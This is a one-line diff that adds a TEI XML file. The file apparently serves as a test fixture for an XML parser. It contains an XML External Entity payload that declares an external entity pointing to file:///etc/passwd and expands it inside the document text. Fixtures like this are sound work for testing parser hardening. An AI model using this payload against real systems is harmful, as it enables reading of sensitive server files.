@@ -1,0 +1,1 @@
+<!DOCTYPE TEI [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><TEI><text>&xxe;</text></TEI>
